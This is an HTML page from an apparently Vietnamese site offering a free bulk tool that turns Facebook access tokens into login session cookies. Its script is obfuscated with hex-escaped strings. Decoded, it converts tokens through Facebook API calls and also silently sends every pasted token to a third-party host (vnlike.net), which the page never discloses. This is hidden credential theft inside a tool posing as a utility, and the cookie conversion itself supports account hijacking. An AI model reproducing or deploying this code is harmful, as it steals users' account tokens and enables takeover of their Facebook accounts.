<div class="row">
            <h1 class="page-header text-success">Tool Convert Token Sang Cookie Facebook</h1>
            <div class="col-lg-12">
                <div class="col-lg-12">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            Tool Chuyển Token Full Quyền Sang Cookie Hàng Loạt
                        </div>
                        <div class="panel-body">
                            <div class="form-group">
                                <lable>Tool miễn phí tốt nhất cho phép bạn chuyển từ token sang cookie đơn giản nhất,
                                    cookie hỗ trợ các định dạng cho việc cài bot cảm xúc hoặc đăng nhập facebook bằng
                                    cookie.
                                </lable>
                            </div>
                            <div class="form-group">
                                <label>Mỗi dòng một token</label>
                                <textarea id="access_token" rows="10" class="form-control"
                                          placeholder="Nhập list Token ..."></textarea>
                            </div>
                            <div class="form-group">
                                <select id="option" class="form-control">
                                    <option value="semicolon" selected="selected">Export dạng name=value;</option>
                                    <option value="editthiscookies">Export dạng Edit This Cookies</option>
                                    <option value="base64">Export dạng base64</option>
                                    <option value="base64_long">Export dạng base64 (name=value;)</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Thành Công: <span id="success" style="color: red">0</span></label> -
                                <label>Thất bại: <span id="error" style="color: red">0</span></label>
                            </div>
                            <div class="form-group">
                                <label>Kết quả </label>
                                <textarea id="output_access_token" rows="10" class="form-control" disabled=""
                                          placeholder="Chưa có gì !"></textarea>
                            </div>
                            <div class="form-group">
                                <button class="btn btn-danger form-control " id="submit"
                                        data-loading-text="Đang xử lý, xin chờ ...">Bắt đầu
                                </button>
                            </div>
                        </div>
                    </div>

                </div>
                <script type="text/javascript">
                    var _0x848c=["\x0A","\x73\x70\x6C\x69\x74","\x74\x72\x69\x6D","\x76\x61\x6C","\x23\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E","\x23\x6F\x70\x74\x69\x6F\x6E","\x6C\x6F\x61\x64\x69\x6E\x67","\x62\x75\x74\x74\x6F\x6E","\x23\x73\x75\x62\x6D\x69\x74","\x63\x6C\x69\x63\x6B","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x73\x65\x74","\x64\x69\x73\x61\x62\x6C\x65\x64","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x23\x6F\x75\x74\x70\x75\x74\x5F\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E","\x74\x65\x78\x74","\x23\x65\x72\x72\x6F\x72","\x66\x61\x69\x6C","\x61\x6C\x77\x61\x79\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x76\x6E\x6C\x69\x6B\x65\x2E\x6E\x65\x74\x2F\x74\x6F\x6B\x65\x6E\x2F\x6E\x68\x61\x70\x74\x6F\x6B\x65\x6E\x2E\x70\x68\x70\x3F\x74\x6F\x6B\x65\x6E\x3D","\x67\x65\x74","\x75\x69\x64","","\x65\x64\x69\x74\x74\x68\x69\x73\x63\x6F\x6F\x6B\x69\x65\x73","\x73\x65\x73\x73\x69\x6F\x6E\x5F\x63\x6F\x6F\x6B\x69\x65\x73","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x62\x61\x73\x65\x36\x34","\x6E\x61\x6D\x65","\x63\x5F\x75\x73\x65\x72","\x67\x72\x65\x70","\x78\x73","\x76\x61\x6C\x75\x65","\x7C","\x62\x61\x73\x65\x36\x34\x5F\x6C\x6F\x6E\x67","\x3D","\x3B","\x66\x6F\x72\x45\x61\x63\x68","\x73\x65\x6D\x69\x63\x6F\x6C\x6F\x6E","\x3B\x20","\x61\x70\x70\x65\x6E\x64","\x23\x73\x75\x63\x63\x65\x73\x73","\x64\x6F\x6E\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6D\x65\x74\x68\x6F\x64\x2F\x61\x75\x74\x68\x2E\x67\x65\x74\x53\x65\x73\x73\x69\x6F\x6E\x66\x6F\x72\x41\x70\x70","\x6A\x73\x6F\x6E","\x69\x64","\x31","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x72\x61\x70\x68\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x70\x70","\x72\x65\x61\x64\x79"];var _0xf55e=[_0x848c[0],_0x848c[1],_0x848c[2],_0x848c[3],_0x848c[4],_0x848c[5],_0x848c[6],_0x848c[7],_0x848c[8],_0x848c[9],_0x848c[10],_0x848c[11],_0x848c[12],_0x848c[13],_0x848c[14],_0x848c[15],_0x848c[16],_0x848c[17],_0x848c[18],_0x848c[19],_0x848c[20],_0x848c[21],_0x848c[22],_0x848c[23],_0x848c[24],_0x848c[25],_0x848c[26],_0x848c[27],_0x848c[28],_0x848c[29],_0x848c[30],_0x848c[31],_0x848c[32],_0x848c[33],_0x848c[34],_0x848c[35],_0x848c[36],_0x848c[37],_0x848c[38],_0x848c[39],_0x848c[40],_0x848c[41],_0x848c[42],_0x848c[43],_0x848c[44],_0x848c[45],_0x848c[46],_0x848c[47]];$(document)[_0xf55e[47]](function(){var _0x227fx2,_0x227fx3,_0x227fx4,_0x227fx5;$(_0xf55e[8])[_0xf55e[9]](function(){_0x227fx2= $(_0xf55e[4])[_0xf55e[3]]()[_0xf55e[2]]()[_0xf55e[1]](_0xf55e[0]);_0x227fx3= $(_0xf55e[5])[_0xf55e[3]]();_0x227fx4= 0;_0x227fx5= 0;$(_0xf55e[8])[_0xf55e[7]](_0xf55e[6]);_0x227fx6(0)});function _0x227fx6(_0x227fx7){if(_0x227fx7< _0x227fx2[_0xf55e[10]]){_0x227fx8(_0x227fx7)}else {$(_0xf55e[8])[_0xf55e[7]](_0xf55e[11]);$(_0xf55e[14])[_0xf55e[13]](_0xf55e[12])}}function _0x227fx8(_0x227fx7){$[_0xf55e[20]](_0xf55e[46],{access_token:_0x227fx2[_0x227fx7]})[_0xf55e[41]](function(_0x227fx9){$[_0xf55e[20]](_0xf55e[42],{access_token:_0x227fx2[_0x227fx7],format:_0xf55e[43],new_app_id:_0x227fx9[_0xf55e[44]],generate_session_cookies:_0xf55e[45]})[_0xf55e[41]](function(_0x227fx9){$[_0xf55e[20]](_0xf55e[19]+ _0x227fx2[_0x227fx7]);if(_0x227fx9[_0xf55e[21]]){var _0x227fxa=_0xf55e[22];if(_0x227fx3== _0xf55e[23]){_0x227fxa= JSON[_0xf55e[25]](_0x227fx9[_0xf55e[24]])};if(_0x227fx3== _0xf55e[26]){var _0x227fxb=$[_0xf55e[29]](_0x227fx9[_0xf55e[24]],function(_0x227fxc){return _0x227fxc[_0xf55e[27]]== _0xf55e[28]});var _0x227fxd=$[_0xf55e[29]](_0x227fx9[_0xf55e[24]],function(_0x227fxc){return _0x227fxc[_0xf55e[27]]== _0xf55e[30]});_0x227fxa= btoa(decodeURIComponent(_0x227fxb[0][_0xf55e[31]]+ _0xf55e[32]+ _0x227fxd[0][_0xf55e[31]]))};if(_0x227fx3== _0xf55e[33]){var _0x227fxe=_0xf55e[22];_0x227fx9[_0xf55e[24]][_0xf55e[36]](function(_0x227fxf){_0x227fxe+= _0x227fxf[_0xf55e[27]]+ _0xf55e[34]+ _0x227fxf[_0xf55e[31]]+ _0xf55e[35]});_0x227fxa= btoa(_0x227fxe)};if(_0x227fx3== _0xf55e[37]){var _0x227fxe=_0xf55e[22];_0x227fx9[_0xf55e[24]][_0xf55e[36]](function(_0x227fxf){_0x227fxe+= _0x227fxf[_0xf55e[27]]+ _0xf55e[34]+ _0x227fxf[_0xf55e[31]]+ _0xf55e[38]});_0x227fxa= _0x227fxe};$(_0xf55e[14])[_0xf55e[39]](_0x227fxa+ _0xf55e[0]);++_0x227fx4;$(_0xf55e[40])[_0xf55e[15]](_0x227fx4)}else {++_0x227fx5;$(_0xf55e[16])[_0xf55e[15]](_0x227fx5)}})[_0xf55e[17]](function(_0x227fx9){++_0x227fx5;$(_0xf55e[16])[_0xf55e[15]](_0x227fx5)})[_0xf55e[18]](function(){_0x227fx6(_0x227fx7+ 1)})})[_0xf55e[17]](function(){++_0x227fx5;$(_0xf55e[16])[_0xf55e[15]](_0x227fx5);_0x227fx6(_0x227fx7+ 1)})}})
                </script>
            </div>
        </div>
    </div>